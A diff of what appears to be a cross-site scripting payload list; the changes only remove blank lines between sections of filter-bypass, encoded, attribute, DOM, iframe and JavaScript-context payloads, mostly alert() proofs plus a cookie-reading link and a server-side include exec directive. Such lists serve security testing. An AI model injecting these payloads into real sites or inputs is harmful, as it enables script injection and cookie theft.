@@ -7,7 +7,6 @@
 <object data="javascript:alert('XSS')"></object>
 <embed src="javascript:alert('XSS')">
 <select onchange="alert('XSS')"><option>Option</option></select>
-
 # Bypass Filtering Payloads
 "><ScRiPt>alert('XSS')</sCriPt>
 "><sCrIpT>alert('XSS')</ScRipt>
@@ -18,7 +17,6 @@
 <img src="javascript:alert('XSS')">
 <a href="data:text/html,<script>alert('XSS')</script>">XSS</a>
 "><iframe srcdoc="<script>alert('XSS')"></iframe>
-
 # Attribute-Based XSS Payloads
 <img src="x" onerror="alert('XSS')" />
 <div style="background-image: url(javascript:alert('XSS'))">
@@ -28,14 +26,12 @@
 <video src=1 onerror="alert('XSS')"></video>
 <marquee onstart="alert('XSS')">XSS</marquee>
 <audio src="x" onerror="alert('XSS')"></audio>
-
 # Encoded/Obfuscated Payloads
 %3Cscript%3Ealert('XSS')%3C%2Fscript%3E
 <script>alert(&#39;XSS&#39;)</script>
 <script>alert(String.fromCharCode(88,83,83))</script>
 <img src=x onerror=eval(atob('YWxlcnQoJ1hTUycp'))> (Base64 encoded)
 <!--#exec cmd="/bin/echo '<script>alert(1)</script>'" -->
-
 # Advanced/Contextual XSS Payloads
 "><img src=x oneonerrorrror=alert(1)//">
 <img src= onerror='alert(1)' >
@@ -47,7 +43,6 @@
 <meta http-equiv="refresh" content="0;url=javascript:alert('XSS')">
 <svg><desc><![CDATA[</desc><script>alert('XSS')]]></svg>
 <body background="javascript:alert('XSS')">
-
 # DOM-Based XSS Payloads
 #"><svg onload=alert('XSS')>
 <script>document.write('<img src=x onerror=alert("XSS")>')</script>
@@ -56,14 +51,12 @@
 <img src=# onerror="javascript:alert('XSS')" />
 <a href="javascript:alert(document.cookie)">Test</a>
 <input value="'';!--"<XSS>=&{()}">
-
 # Iframe/JavaScript URI Payloads
 <iframe src="javascript:alert('XSS')"></iframe>
 <iframe src="data:text/html,<script>alert('XSS')</script>"></iframe>
 <a href="vbscript:msgbox('XSS')">Click</a>
 <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg'%3E%3Cscript%3Ealert('XSS')%3C/script%3E%3C/svg%3E">
 <form><button formaction="javascript:alert('XSS')">X</button></form>
-
 # JavaScript Context XSS
 ';alert('XSS');//
 ';alert(String.fromCharCode(88,83,83))//
@@ -71,7 +64,6 @@
 "/><script>alert('XSS')</script>"
 }); alert('XSS');//
 '); alert('XSS'); //
-
 # Miscellaneous Payloads
 <plaintext>alert('XSS')</plaintext>
 <bgsound src="javascript:alert('XSS')">
